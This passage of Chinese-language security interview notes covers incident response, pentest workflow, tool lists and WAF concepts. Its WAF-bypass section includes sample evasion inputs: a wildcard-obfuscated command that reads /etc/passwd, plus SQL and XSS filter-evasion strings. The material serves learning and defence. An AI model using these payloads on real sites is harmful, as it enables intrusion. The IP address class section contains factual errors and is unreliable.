需要注意的是，在进行蠕虫病毒的处置过程中，需要遵循一些安全规范和最佳实践，例如备份数据、更新系统和软件、加强访问控制等。同时，需要对应急处置过程进行记录和报告，以便进行后续的审计和调查。另外，在面对蠕虫病毒时，需要及时更新防病毒软件和操作系统，以防止受到已知漏洞的攻击。

#### 如何发现钓鱼邮件？

钓鱼邮件是一种常见的网络针对性攻击手段，通常通过电子邮件发送虚假信息诱骗受害者提供个人敏感信息或进行非法行为。以下是几种发现钓鱼邮件的方法：

- 查看发件人地址：钓鱼邮件的发件人地址通常会伪装成合法、可信的机构或公司，但是如果您仔细查看发件人地址，就可能发现其不是该机构或公司真正的域名。
- 检查链接地址：钓鱼邮件中通常会包含可疑的链接，如果您将鼠标悬停在链接上，就可以看到链接的真实地址。如果该地址与邮件内容不符，就可能是钓鱼邮件。
- 注意邮件内容：钓鱼邮件通常会给人留下一种紧急、必须立即采取行动的感觉，从而诱骗用户点击链接或执行某些操作。因此，如果您收到这样的邮件，请仔细阅读邮件内容，并多加思考和确认。
- 尽量避免下载附件：钓鱼邮件通常会携带恶意附件，如果您无法确认邮件的真实性，最好不要下载或打开这些附件，以免被感染。
- 安装反钓鱼软件：有一些反钓鱼软件可以帮助用户检测和拦截钓鱼邮件，例如 Google 的Password Alert 等。

总之，发现钓鱼邮件需要多加警惕和注意，在收到可疑邮件时，应该仔细查看邮件内容和相关信息，并尽可能采取措施避免被钓鱼攻击。

#### 钓鱼邮件应急处置流程

钓鱼邮件是一种常见的网络安全威胁，它通常伪装成合法的邮件或网站，骗取用户的个人信息、账户和密码等敏感信息。以下是一般的钓鱼邮件应急处置流程：

1. 发现钓鱼邮件：通过监控和审计，检测到受感染的计算机或网络上存在钓鱼邮件后，需要立即采取行动。
2. 确认钓鱼邮件：首先，需要确认钓鱼邮件的来源和内容。可以查看邮件头部信息和链接地址，以确定邮件是否是钓鱼邮件。
3. 切断网络连接：如果用户已经点击了钓鱼邮件中的链接或下载了恶意附件，需要立即切断受感染计算机或网络的网络连接，以防止受到更多的攻击和损失。
4. 收集证据：在切断网络连接后，需要立即开始收集证据。可以使用一些工具，例如反病毒软件、系统日志分析工具、文件扫描工具等，来收集钓鱼邮件的相关数据和信息。
5. 分析钓鱼邮件：收集证据之后，需要对钓鱼邮件进行分析。可以使用一些工具，例如反病毒软件、系统日志分析工具、文件扫描工具等，来分析钓鱼邮件的类型、来源和影响范围。
6. 制定应急响应计划：在分析钓鱼邮件之后，需要制定应急响应计划。该计划应该包括清除恶意文件、加强访问控制等。同时，需要制定应对未来钓鱼邮件的预防措施，以减轻潜在的安全风险。
7. 清除恶意文件：在制定应急响应计划之后，需要立即清除钓鱼邮件中的恶意文件。可以使用一些工具，例如反病毒软件、系统修复工具等，来清除恶意文件和相关的恶意代码。
8. 加强访问控制：在清除恶意文件之后，需要加强访问控制。可以限制网络流量、加强账户和密码管理等，以防止未经授权的访问和攻击。

需要注意的是，在进行钓鱼邮件的处置过程中，需要遵循一些安全规范和最佳实践，例如备份数据、更新系统和软件、加强访问控制等。同时，需要对应急处置过程进行记录和报告，以便进行后续的审计和调查。另外，需要对用户进行安全教育和培训，以提高其识别和防范钓鱼邮件的能力。

钓鱼邮件是指伪装成合法机构或个人发送的欺诈性电子邮件，目的是骗取受害者的账户信息、密码、财务信息等敏感信息。应急处理钓鱼邮件的流程通常包括以下步骤：

1. 隔离受影响的电脑：首先，需要隔离受影响的电脑，以防止恶意软件继续传播或窃取敏感信息。
2. 收集邮件头和内容：收集钓鱼邮件的邮件头和内容，以便进一步分析和排查。
3. 分析邮件内容：对邮件内容进行分析，了解其特征和行为，以确定其类型、攻击途径和攻击目的。
4. 判定是否是钓鱼邮件：根据邮件内容、发件人、邮件标题等信息，判断是否是钓鱼邮件或其他欺诈邮件。
5. 沟通受害者：如果有受害者已经受到影响，需要与他们进行沟通，确认是否已经泄露敏感信息，并采取相应的措施。
6. 封锁发件人域名或IP：通过封锁发件人的域名或IP地址，防止其继续发送钓鱼邮件。
7. 删除邮件：删除所有与钓鱼邮件相关的邮件，以防止用户误操作。
8. 加强安全培训：对受影响的员工进行安全培训，加强安全意识，提高识别钓鱼邮件和欺诈邮件的能力。

需要注意的是，钓鱼邮件可能会涉及到多个受害者和多个攻击者，处理过程中需要进行全面的取证和分析，并确保取证过程合法有效。建议在应急处理之前，先评估风险并制定详细的应急响应计划。同时，加强安全防护措施，定期更新安全补丁，提高用户的安全意识，可以有效预防钓鱼邮件的发生。

#### 不死马/内存马应急处置流程

不死马/内存马是一种常见的网络安全威胁，它通常伪装成合法的程序或进程，隐藏在计算机内存中，难以被检测和清除。以下是一般的不死马/内存马应急处置流程：

1. 发现不死马/内存马：通过监控和审计，检测到受感染的计算机或网络上存在不死马/内存马后，需要立即采取行动。
2. 确认不死马/内存马：首先，需要确认不死马/内存马的来源和内容。可以查看系统进程、服务和程序，以确定是否存在不正常的进程和服务。
3. 切断网络连接：如果不死马/内存马已经连接到外部服务器或下载了恶意文件，需要立即切断受感染计算机或网络的网络连接，以防止受到更多的攻击和损失。
4. 收集证据：在切断网络连接后，需要立即开始收集证据。可以使用一些工具，例如反病毒软件、系统日志分析工具、内存分析工具等，来收集不死马/内存马的相关数据和信息。
5. 分析不死马/内存马：收集证据之后，需要对不死马/内存马进行分析。可以使用一些工具，例如反病毒软件、系统日志分析工具、内存分析工具等，来分析不死马/内存马的类型、来源和影响范围。
6. 制定应急响应计划：在分析不死马/内存马之后，需要制定应急响应计划。该计划应该包括清除不死马/内存马、修复漏洞、加强访问控制等。同时，需要制定应对未来不死马/内存马的预防措施，以减轻潜在的安全风险。
7. 清除不死马/内存马：在制定应急响应计划之后，需要立即清除不死马/内存马。可以使用一些工具，例如反病毒软件、系统修复工具等，来清除不死马/内存马和相关的恶意代码。
8. 修复漏洞：在清除不死马/内存马之后，需要修复系统和应用程序中的漏洞，以减轻潜在的安全风险。
9. 加强访问控制：在修复漏洞之后，需要加强访问控制。可以限制网络流量、加强账户和密码管理等，以防止未经授权的访问和攻击。
10. 监控检测：在应急响应处理结束后，需要加强网络安全监控和检测工作，及时发现和处理新的安全威胁。

需要注意的是，在进行不死马/内存马的处置过程中，需要遵循一些安全规范和最佳实践，例如备份数据、更新系统和软件、加强访问控制等。同时，需要对应急处置过程进行记录和报告，以便进行后续的审计和调查。另外，在面对不死马/内存马时，需要及时更新防病毒软件和操作系统，以防止受到已知漏洞的攻击。

不死马（也称为内存马）是指一种能够在内存中长期驻留的恶意软件，可以在系统重启后继续执行的恶意程序。应急处理不死马的流程通常包括以下步骤：

1. 隔离受感染的主机：首先，需要立即隔离受感染的主机，以防止恶意程序进一步感染其他系统。
2. 收集样本：对受感染主机进行取证，收集恶意程序样本，以便进一步分析排查。
3. 分析样本：对恶意程序进行分析，了解其特征和行为，以确定其类型、感染途径和攻击目的。
4. 停止不死马进程：通过查找进程、端口和服务等信息，找到不死马进程并停止它。通常可以使用反恶意软件工具或命令行工具来查找并停止恶意进程。
5. 清除恶意文件：删除所有与不死马相关的恶意文件，包括可执行文件、配置文件、注册表项等。
6. 修复漏洞：分析攻击途径，找到漏洞并修复它们，以防止类似攻击再次发生。
7. 恢复系统：对主机进行全面扫描和清除，恢复受感染系统的正常运行状态。
8. 监测和预防：加强安全防护措施，定期检查系统漏洞和安全漏洞，及时更新补丁，防范类似攻击的发生。

需要注意的是，不死马通常比较难以清除，可能需要采取多种手段进行处理。同时，应急处理过程中需要遵循取证原则，确保取证过程合法有效。建议在应急处理之前，先评估风险并制定详细的应急响应计划。

#### 如何处理.exe文件？

.exe 文件是 Windows 上的可执行文件，通常包含应用程序或者安装程序等内容。如果您在电子邮件或者网络上收到了 .exe 文件，需要格外小心，因为它们可能包含病毒、恶意软件或者其他危险物品。以下是几种处理方法：

- 不要直接运行：不要轻易双击或者打开未知来源的 .exe 文件，因为它们可能会启动恶意软件，并对您的系统造成损害。如果您必须要运行这些 .exe 文件，请先进行杀毒软件扫描和检测操作。
- 使用虚拟机：如果您需要测试某个 .exe 文件的行为和效果，可以考虑使用虚拟机。虚拟机可以将一个完整的操作系统运行在一个软件容器中，使得用户可以在其中安全地运行可疑的 .exe 文件，并且不会影响主机系统的安全性。
- 上传到在线扫描服务平台：一些在线杀毒软件平台，例如 VirusTotal 等，提供了在线扫描可疑文件的服务。如果您不确定一个 .exe 文件是否安全，可以上传到这些平台进行扫描，以获取更多的信息和建议。
- 将文件发送给安全专家：如果您无法确定 .exe 文件的安全性，可以将其发送给安全专家进行分析。安全专家可以根据其行为特征和结构等信息，对该文件进行深度分析，以确定是否存在潜在的安全威胁。

总之，在处理未知来源的 .exe 文件时，需要注意谨慎并采取必要的安全措施，以确保您的系统不会被攻击或感染。如果您遇到可疑的 .exe 文件，请务必进行杀毒软件扫描，并尽可能获取更多的信息和建议。

#### 普通的加固手段？

普通的加固手段包括以下几种：

- 更新补丁：定期更新操作系统、应用程序的补丁，修复已知的漏洞和安全问题。
- 强化口令策略：采用复杂、难以猜测的密码，并进行定期更换。同时可以启用账户锁定、多次失败尝试限制等功能，提高口令安全性。
- 加强身份验证：采用多因素身份验证技术，例如使用硬件令牌、生物特征等方式，确保只有授权用户才能访问系统。
- 安装防病毒软件：安装并及时更新防病毒软件，定期进行全盘扫描和实时监控，以便及时发现和处置潜在的恶意软件。
- 关闭不必要服务：关闭系统中不必要的服务和端口，降低攻击面，避免被利用。
- 限制访问权限：根据业务需要，设置合理的访问权限，对于未授权的用户或者设备进行限制，提高系统的安全性。
- 数据备份与恢复：定期备份重要数据，并将其存储在安全可靠的位置。在出现故障或事件时，能够快速恢复数据，避免数据丢失和系统停机。

总之，以上这些普通的加固手段可以帮助提高系统的安全性和稳定性，并且也是网络安全基础建设的关键步骤。在实际操作中，需要根据具体情况和需求，结合其他安全措施来进行综合加固。同时需要注意及时更新和检查，以确保系统始终处于安全状态。

#### 日志及木马被删除如何排查？

被攻击后，日志文件和木马文件被删除会给排查工作带来很大的困难，但还是有一些方法可以尝试：

- 查看系统备份：如果您的系统进行了定期备份，那么可以尝试从备份中恢复丢失的日志文件和木马文件。如果备份没有受到攻击，那么这种方式可能会非常有效。
- 恢复已删除文件：一些数据恢复软件，例如Recuva、EaseUS      Data Recovery等，可以恢复已删除的文件。您可以尝试使用这些软件来恢复被删除的文件。
- 检查其他主机：如果您的系统被集成到网络中，可以检查其他主机是否有相同的攻击迹象和后门程序。对于攻击者来说，攻击多台主机通常需要更多的时间和资源，因此在其他主机上发现类似的攻击行为也许能够提供有用的信息。
- 分析系统快照：如果您的系统支持系统快照功能，例如 Windows 系统还原点，可以尝试回滚系统至之前的快照状态，并分析该状态下的日志信息和系统状态，以寻找攻击行为的证据。
- 日志审计：如果日志文件被删除，可以尝试通过其他渠道收集日志信息，并进行审计分析。例如，可以检查网络流量、系统性能、系统进程等信息，以确定是否存在异常行为。

总之，在日志文件和木马文件被删除的情况下，需要采用其他方法来寻找攻击迹象和证据。同时，为了避免这种情况的发生，我们应该在系统中设置必要的日志轮转和备份策略，并加强安全防御工作，避免被攻击者入侵。

### ⭐渗透测试经验

#### 描述一下渗透测试的基本流程，介绍下渗透过程中你常用的工具？

渗透测试是一种授权的安全评估方法，用于评估目标系统或应用程序的网络安全性，以发现潜在的漏洞和弱点。渗透测试的基本流程如下：

1. 信息收集：在渗透测试之前，进行广泛的信息收集，包括目标系统或应用程序的架构、网络拓扑、IP地址范围、域名信息等。这可以通过公开的信息收集技术（如搜索引擎、WHOIS查询）和被动扫描工具（如Shodan、Censys）来完成。
2. 漏洞扫描和分析：使用自动化工具（如Nessus、OpenVAS）进行漏洞扫描，识别目标系统或应用程序中存在的已知漏洞。然后对扫描结果进行分析，确认漏洞的真实性和严重性，并排除误报。
3. 漏洞利用：根据漏洞扫描结果，选择合适的漏洞进行利用。这可能涉及使用漏洞利用工具（如Metasploit、ExploitDB）或编写自定义的漏洞利用代码。通过利用漏洞，获取系统的访问权限，进一步探测和扩大攻击面。
4. 权限提升和持久化：在渗透测试中，一旦获得初始访问权限，进一步提升权限以获取更高的权限级别，以便在系统中保持持久访问。这可能包括利用操作系统或应用程序的弱点，获取管理员权限或域控制器权限等。
5. 数据收集和目标探测：一旦在系统中建立持久访问权限，渗透测试人员将收集目标系统的更多信息，如用户凭证、敏感数据、网络拓扑等。这可以通过网络抓包工具（如Wireshark）和文件系统浏览器来完成。
6. 清理和报告：在渗透测试结束后，渗透测试人员应该清理对系统的任何更改或痕迹，确保不会对目标系统产生负面影响。然后，编写渗透测试报告，详细描述发现的漏洞、攻击路径和建议的修复措施。

在渗透测试过程中，渗透测试人员可能使用各种工具，具体选择取决于目标系统和应用程序的特性。常用的渗透测试工具包括：

- Nmap：用于网络映射和端口扫描，帮助发现目标系统的开放端口和服务。

- Nessus/OpenVAS：漏洞扫描工具，能够检测目标系统上已知的漏洞和弱点。

- Metasploit：用于渗透测试和漏洞利用的框架，包含大量的攻击模块和漏洞利用脚本。

- Burp Suite：用于Web应用程序渗透测试的综合工具，包括代理服务器、漏洞扫描器、攻击工具等。

- Wireshark：网络协议分析工具，可以捕获和分析网络流量，帮助识别潜在的安全问题。

- Hydra：用于密码破解的工具，支持多种协议和服务的暴力破解。

- John the Ripper：另一个密码破解工具，支持多种加密算法的密码破解。

- Sqlmap：用于自动化检测和利用SQL注入漏洞的工具，主要用于对数据库进行渗透测试。

#### 给你一个登录框，你会如何进行渗透测试？

渗透测试是一项系统性的工作，需要有一定的计划和方法。下面是我通常用于渗透测试一个登录框的方法：

1. 收集信息：首先需要了解登录框的具体信息，例如登录页面的 URL、使用的技术栈、是否有任何已知的漏洞等。可以使用网络扫描工具，如Nmap，或者手动浏览登录页面收集信息。
2. 探测弱点：在收集信息的基础上，可以使用一些工具，如Burp Suite或OWASP ZAP，来探测登录框是否存在弱点，例如SQL注入、XSS攻击等。这些工具可以模拟攻击并生成报告，指出存在的安全漏洞。
3. 尝试破解：如果登录框使用的是弱密码或者默认密码，我们可以尝试使用破解工具，如John the Ripper或Hashcat，来破解密码。当然，这种方法只适用于没有启用账号锁定或者IP封禁等安全措施的情况。
4. 绕过登录：如果以上方法都无法成功，我们可以尝试绕过登录框，例如通过绕过验证、绕过客户端脚本等方式。这需要针对具体的登录框进行研究和测试，需要有一定的技术水平和经验。
5. 社会工程学攻击：如果以上方法都无法成功，我们可以使用社会工程学攻击，例如钓鱼邮件、伪造登录页面等方式。这种方法需要有一定的审美能力和心理分析能力，需要了解目标用户的行为习惯和思维方式。

#### 给你一个类似google的搜索框，你会如何进行渗透测试？

对于一个类似 Google 的搜索框，渗透测试的方法类似于渗透测试登录框的方法。下面是我通常用于渗透测试一个搜索框的方法：

1. 收集信息：首先需要了解搜索框的具体信息，例如搜索页面的 URL、使用的技术栈、是否有任何已知的漏洞等。可以使用网络扫描工具，如Nmap，或者手动浏览搜索页面收集信息。
2. 探测弱点：在收集信息的基础上，可以使用一些工具，如Burp Suite或OWASP ZAP，来探测搜索框是否存在弱点，例如SQL注入、XSS攻击等。这些工具可以模拟攻击并生成报告，指出存在的安全漏洞。
3. 尝试注入攻击：如果搜索框存在注入攻击漏洞，我们可以尝试使用一些注入攻击工具，如SQLMap或NoSQLMap，来进行注入攻击，获取目标系统的敏感信息。
4. 尝试绕过安全措施：如果搜索框存在防御措施，例如过滤或限制输入字符、验证输入数据等，我们可以尝试使用一些技巧和方法，例如使用编码字符绕过过滤、使用特殊字符绕过验证等，来绕过安全措施。
5. 尝试模拟恶意用户的行为：我们可以尝试使用一些工具模拟恶意用户的行为，例如使用爬虫工具批量抓取搜索结果、进行暴力猜测密码等，来测试搜索框的安全性。

#### 你在渗透测试中常用到的工具？

**信息收集**

Nmap，Fofa，Shodan，zoomeye，站长工具，Bugscaner，潮汐指纹，云悉指纹，Censys，whatweb，WTFScan，子域名挖掘机，dnsdist6，WAFw00f，Fping，arping，nping，nbtscan，whois，Layer子域名收集工具，JSFinder，wwwscan等

**抓包分析**

Burp Suite,Wireshark, TrafficTools，fiddler，hack firefox，proxifier，shadowsocks等

**端口扫描**

Nmap，Zenmap，Masscan，御剑端口扫描工具,Hping3，Advanced_Port_Scanner，PortScan ,netscan tools,blackwater,Unicornscan,nast,Knocker,IPscan等

**漏洞扫描**

Nessus，AWVS，X-ray，Appscan，W3af，OpenVAS，Skipfish，lynis，WPscan，Comodo HackerProof，Nexpose community，Vulnerability Manager Plus，Nikto等

**目录扫描或爆破**

Dirbuster，御剑目录爆破工具，dirsearch，dirb，ffuf，Dirmap，cansin，Wscan，

webdirscan，SourceLeakHacker，fuff等

**暴力破解**

Burp Suite，Hydra，cupp，crunch，Aircrack-NG(无线密码破解)，John the Ripper，Rainbow Crack，Cain & Able，L0phtcrack， Ophcrack，Crack，Hashcat，SAMInside，DaveGrohl(Mac  os   x) ，Ncrack，Brutus，Wfuzz，Medusa等

**SQL注入漏洞扫描或利用**

Sqlmap，SQLiScanner，DSSS，Jsql-injection，nosqlattack,Safe3 SQL Injector,

BSQL Hacker,The Mole,Pangolin,Havij,Enema SQLi,sqlsus,SQL Poizon，Netsparker，Leviathan，NoSQLMap，Tyrant SQL，Whitewidow等

**XSS漏洞利用**

Cobalt Strike，Beef，XSSer，XSpear，TamperIE，BlueLotus_XSSReceiver(XSS利用平台)，XSSYA，xssfork，xssScanner，XSSCon，BruteXSS，XDT等

**WebShell利用**

冰蝎，哥斯拉，蚁剑，中国菜刀，天蝎(skyscorpion),  pyshell，w8ay，WebKnife，XISE，K8飞刀，Altman，Hatchet，AspxClient(仅支持ASPX脚本)，C刀（Cknife），QuasiBot，Weevely，WeBaCoo， Webhandler，Webshell-Sniper，PhpSploit，SharPyShell等

**免杀**

Shellter，FourEye，crazyKiller，DKMC，avevasion，charlotte，cool，crossnet，darkarmour，shellcodeloader，vmprotect，vprotect，ZheTian，peidtool，Mimikatz，PrintSpoofer，metasploit，Veil，avet ，Green hat pro，Venom ，TheFatRat，Insanity等

**综合**

Metasploit，GUI_Tools，Hijacker(针对Android)，AttackSurfaceMapper，Burp Suite，watchdog，Empire等

#### 使用过哪些安全设备？

**webshell查杀**

D盾_Web查杀，百度WEBDIR+(在线)，河马(全平台，CloudWalker(牧云)(全平台)，Web Shell Detector(在线)，Sangfor WebShellKill(深信服)，深度学习模型检测PHP Webshell(在线)，PHP Malware Finder webshell(全平台)，findWebshell，Webshell.pub专注查杀(在线)等

**病毒查杀**

火绒，腾讯安全管家，360杀毒，Rkhunter，卡巴斯基，金山毒霸，瑞星杀毒软件，大蜘蛛，深信服EDR，Rootkit，NOD32，Clamav，virustotal等

**安全防护**

网站安全狗，创宇盾，云锁，阿里云WAF,HiHTTPS，ModSecurity，Naxsi,OpenWAF,FreeWAF，ESAPI WAF，unixhot，Java WAF，X-WAF，VeryNginx，COMODO Firewall等

**应急响应**

火绒剑，微步云沙箱，Goby，PowerTool，Tcpview，PCHunter，ProcessHacker，Everything，ProcessExplorer，ProcessMonitor，XueTr，PCHunter，ProcessDump，AutoRuns，ntfsdir，FastIR，BrowsingHistoryView，sysinspector，sysinternals Suite，Index.dat Analyzer，winhex，RegistryWorkshop，DiskGenius，passrecenc，Fulleventlogview，Wsyscheck，IPOP4.1，Process monitor，Netcat，Malware Defender，MyMonitor，DllInjector，RegShot，gscan，Fodler Monitor，ResHacker，Kaspersky Virus Removal Tool ，DWirelessNetWatcher，ipradar，Fidder，ApateDNS，MiniSniffer，SysTracer等。

#### WAF

**概念：**

Web应用防火墙，简称WAF，是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一种产品，一般部署在Web服务器之前，用来保护Web应用。

**主要功能：**

WAF主要是通过内置的很多安全规则 来进行防御。
可防护常见的SQL注入、XSS、网页篡改、中间件漏洞等OWASP TOP10攻击行。
具有威胁感知能力，当发现攻击后，可将IP进行锁定，IP锁定之后将无法访问网站业务。
也支持防止CC攻击，采用集中度和速率双重检测算法。

**不具备的功能：**(给你加深一下影响，防止你想不起来就乱猜)

WAF不能过滤其他协议流量，如FTP、PoP3协议

WAF不能实现传统防护墙功能，如地址映射

WAF不能防止网络层的DDoS攻击

WAF不能防病毒

#### **绕过WAF的方法？**

**A**

**通配符?,\***

在bash shell中，问号(?)表示通配符，可以替换任意的单个字符（非空），*表示通配符，可以匹配任意长度（包括空）。例如下面的命令与/usr/sbin/cat /etc/passwd是等价的

/usr/s?in/?at /et?/pass?d

**大小写变种**

特征库在编写正则表达式时，可能忽略了对大写的校验。例如select.*from，从而让Select from轻松绕过，正确的写法时，在任何防护的正则表达式前都加上(?i)，表示后面的正则表达式匹配均忽略大小写。

**内联注释/\**/**

在SQL查询语句中加入注释，例如select/**/from，当WAF不摘除注释而去匹配正则表达式时，可能会匹配不上，从而绕过。

**干扰字符污染法**

使用空字符、空格、TAB换行、注释、特殊的函数等等都可以。比如在SQL注入时select/*!*/`version`();   利用网站使用的语言函数特性来绕过WAF的规则或者使用会无视的字符。

**字符编码法**

就是对一些字符进行编码，常见的SQL编码有unicode、HEX、URL、ascll、base64等，XSS编码有：HTML、URL、ASCII、JS编码、base64等等，利用浏览器上的进制转换或者语言编码规则来绕过WAF，比如XSS攻击

**双写，嵌套，拼凑法**

‍‍‍‍如果过滤了某些字符串，我们可以在他们两边加上“原有字符串”的一部分。利用WAF的不完整性，只验证一次字符串或者过滤的字符串并不完整。比如这样

SQL：        selselectect verversionsion(); ‍‍‍‍

XSS：        <scrrip>alalertert</scrrip>

**多请求拆分绕过**

对于多个参数的语句，可以将注入语句分割插入。
如这样的请求：?a=[inputa]&b=[inputb]      可将参数a和b拼接如：

and a=[inputa] and b=[inputb]

**利用cookie绕过**

对于用了$_REQUEST来获取参数的网站可以尝试将payload放在cookie中进行绕过REQUEST会依次从GET POST cookie中获取参数，如果WAF只检测了GET/POST而没有检测cookie，可以将语句放在cookie中进行绕过。

**利用溢量数据绕过WAF**

这种绕过方法利用的是通过提交非常大的数据，由于数据量过大，超过了WAF的正则匹配字符，我们的恶意代码就不经过WAF的正则匹配了，因此我们的恶意代码就可以绕过了。

**WAF绕过之寻找网站源ip**

采用云WAF的网站可以寻找网站真实ip来绕过云WAF的检测。

#### WAF的分类？如何拦截攻击？

WAF（Web 应用程序防火墙）产品通常可以分为以下几种分类：

基于签名的 WAF：基于签名的      WAF 通过检测请求中是否包含已知漏洞的特征，来拦截攻击。这种类型的 WAF 可以快速识别和阻止已知的攻击方式。

基于行为的 WAF：基于行为的      WAF 使用机器学习、人工智能等技术来分析请求的行为模式，并判断其是否具有攻击性。这种类型的 WAF 能够较好地识别未知攻击。

综合型 WAF：综合型      WAF 结合了基于签名和基于行为两种技术，能够同时检测已知攻击和未知攻击，提供更加全面的保护。

WAF 产品一般通过拦截攻击请求来保护 Web 应用程序。具体的拦截方式包括：

黑名单过滤：根据已知的攻击方式，设置黑名单规则，对符合规则的请求进行拦截。

白名单过滤：对请求进行白名单过滤，只允许符合规则的请求通过。

存储过程注入防护：对 SQL 注入进行防护。WAF      可以检测并拦截具有攻击意图的 SQL 语句，并对其进行相应的修复和防护。

跨站脚本（XSS）防护：WAF      可以检测并过滤包含恶意 JavaScript 代码的请求，并防止 XSS 攻击。

防止文件上传漏洞：WAF 可以检测并拦截包含恶意文件的请求，从而避免文件上传漏洞导致的攻击。

总之，WAF 产品可以有效地保护 Web 应用程序免受各种类型的攻击。但是需要注意的是，WAF 并不是万能的，仍然需要结合其他安全措施来保障 Web 应用程序的安全。



## 网传面经

### 护网是干什么？

护网行动是一场网络安全攻防演练，是针对全国范围的真实网络目标为对象的实战攻防活动，旨在评估和提高我国的网络防御能力，增强对网络威胁的应对能力。

### 护网的分组和流程？

领导小组：总体指挥协调

**综合研判组**：分析研判、资源协调

**防护监测组**：事件检测、分析

**应急溯源组**：事件处置

演习保障组：资源保障

备战阶段：主要是为了减少攻击面、排查风险点。资产梳理，主机基线扫描，主机系统加固，漏洞扫描，安全渗透测试等自查。

正式阶段：重点加强防护过程中的安全保障工作，各组人员各司其职，从攻击监测、攻击分析、攻击阻断、漏洞修复和追踪溯源等方面全面加强演习过程的安全防护效果。

### 常见安全工具？扫描端口工具？护网设备？

端口及漏洞扫描：nmap，nessus。

抓包：wireshark，burpsuite。

Web自动化安全扫描：awvs，appsan。

护网设备：下一代应用防火墙，上网行为管理，日志审计系统。

### sftp，telnet，ssh的端口号？ssh与telnet的区别？

sftp：22，telnet：23，ssh：22。简单来说，ssh和telnet的区别就是一个是密文传输，一个是明文传输。

### IP地址规则

IP地址是互联网协议地址，也被称为网际协议地址，它是一个32位的二进制数，并使用点号分隔为4个8位的二进制数，即4字节。所以，IP地址通常使用“点分十进制”的方式，表示为a.b.c.d的形式，其中a、b、c、d都是0~255之间的十进制整数。

IP地址由俩部分组成，分别是网络地址和主机地址。网络地址表示其属于互联网的哪一个网络，主机地址表述其属于该网络中的哪一台主机，这两者是主从关系。IP地址主要是根据子网掩码来划分网段的。根据网络号和主机号的不同，IP地址可以分为：

- A类地址（1.0.0.0~126.0.0.0）：地址范围是1.0.0.0~126.0.0.0，子网掩码是255.0.0.0。该地址中的第一个字节为网络号，后三个字节为主机号。该类IP地址的最前面为0，所以地址的网络号取值在1~126之间。
- B类地址（128.0.0.0~191.255.0.0.0）：地址范围是128.0.0.0~191.255.0.0.0，子网掩码是255.255.0.0。该地址中的前俩个字节为网络号，后两个字节为主机号。该类IP地址的最前面为10，所以地址的网络号取值在128~191之间。
- C类地址（192.0.1.0~223.255.255.0）：地址范围是192.0.1.0~223.255.255.0，子网掩码是255.255.255.0。该地址中前三个字节为网络号，最后一个字节为主机号。该类IP地址的最前面为110，所以地址的网络号取值在129~223之间。
- D类地址（多播地址）：该类IP地址的最前面为1110，所以地址的网络号取值在224~239之间。多播地址是让源设备能够将分组发送给一组设备的地址。属于多播组的设备将被分配为日一个多播组IP地址，多播地址范围是224.0.0.0~239.255.255.255。由于多播地址表示一组设备，因此只能用作分组的目标地址。源地址总是单播地址。多播MAC地址以十六进制值01-00-5E开头，余下的6个十六进制位是根据IP多播组地址的最后23位转换得到的。
- E类地址（保留地址）：该类IP地址的最前面为1111，所以地址的网络号取值在240~255之间。
- 此外，还有一类特殊的IP地址——广播地址。广播地址是专门用于同时向网络中所有主机进行发送的一个地址。在使用TCP/IP协议的网络中，主机标识段为全1的IP地址为广播地址，广播的分组传送给主机标识段所涉及的所有计算机。

### 信息收集的方法有哪些？

在网络安全中，信息收集是为了获取目标系统或组织的相关信息，以便评估其安全性和发现潜在的漏洞。以下是一些常见的信息收集方法：

1. 公开信息收集：通过搜索引擎、社交媒体、新闻报道等公开渠道收集目标系统或组织的信息。这包括域名、IP地址范围、子域名、员工姓名、联系信息等。
2. WHOIS查询：通过WHOIS查询工具，查找域名的注册信息，获取域名所有者的联系信息、注册商、注册日期等。
3. 网络嗅探：通过监听网络流量，收集目标系统的相关信息。这可以使用工具如Wireshark来捕获和分析网络数据包，识别目标主机、协议、服务等。
4. 网络映射和端口扫描：使用工具如Nmap，扫描目标系统的开放端口和服务，了解系统的网络拓扑和服务架构。
5. DNS枚举：通过DNS查询，收集目标系统的域名、子域名、主机记录等信息。工具如Dig和DNSenum可用于执行DNS枚举。
6. 社交工程：通过与目标系统相关的人员进行交流，获取有关系统配置、用户名、密码、访问权限等敏感信息。这可能包括电话采访、电子邮件欺骗、钓鱼攻击等。
7. 漏洞数据库：参考公开的漏洞数据库（如CVE、NVD）和厂商公告，查找目标系统可能存在的已知漏洞和安全弱点。
8. 搜索引擎高级搜索：使用搜索引擎的高级搜索功能，结合特定的关键词和运算符，对目标系统相关的敏感信息进行搜索，如敏感文件、配置文件等。
9. 网络架构图和文档：查阅目标系统的网络架构图、系统文档、应用程序文档等，获取系统配置、网络拓扑、服务器信息等。
10. 开放端口服务识别：通过分析目标系统的开放端口，识别运行在这些端口上的服务和应用程序，从而了解系统的功能和风险。

请注意，信息收集应该始终遵循合法和道德的原则，并获得适当的授权。

### 说说鱼叉攻击和水坑攻击的区别？

鱼叉攻击（Spear Phishing Attack）和水坑攻击（Watering Hole Attack）都是针对特定目标的网络攻击方式，但它们在攻击手段和目标选择上存在一些区别。

鱼叉攻击是一种通过电子邮件或其他通信形式，针对特定个人或组织进行的欺骗性攻击。攻击者在鱼叉攻击中通常会针对特定目标进行精心设计的欺骗性信息，以诱骗目标点击恶意链接、下载恶意附件、提供敏感信息等。鱼叉攻击通常利用社交工程技术，伪装成可信的来源，如合法的机构、知名公司、同事或上级，以增加攻击的成功率。攻击者会针对目标进行详细的情报收集，以使欺骗信息看起来更加真实可信。鱼叉攻击的目的通常是窃取敏感信息、获取凭据、传播恶意软件或进行其他形式的网络入侵。

水坑攻击是一种针对特定群体或组织的攻击方式，攻击者通过感知目标用户的兴趣或行为模式，选择一个经常被目标用户访问的可信网站，将该网站作为攻击的水坑（Watering Hole）。攻击者会对该网站进行渗透，植入恶意代码或利用已知的漏洞，以在访问该网站的目标用户中传播恶意软件或获取敏感信息。攻击者利用目标用户对该网站的信任，使用户在不知情的情况下感染恶意软件或泄露敏感信息。水坑攻击通常需要对目标用户的兴趣、行为模式和访问习惯进行详细分析和情报收集，以选择适当的水坑网站，并确定恶意代码的投放时机。

因此，鱼叉攻击注重个人化的欺骗手段，通过定制的欺骗性信息诱使目标个人采取特定行动。而水坑攻击则针对目标用户群体，利用可信网站作为传播恶意代码的平台，诱使目标用户访问受感染的网站，从而达到攻击目的。

### 判断出靶标的CMS对攻击有什么意义？

判断目标的内容管理系统（CMS）对攻击具有重要的意义，因为不同的CMS可能存在不同的漏洞和安全弱点，攻击者可以利用这些漏洞来入侵网站或进行其他恶意活动。以下是判断目标CMS对攻击的重要性：

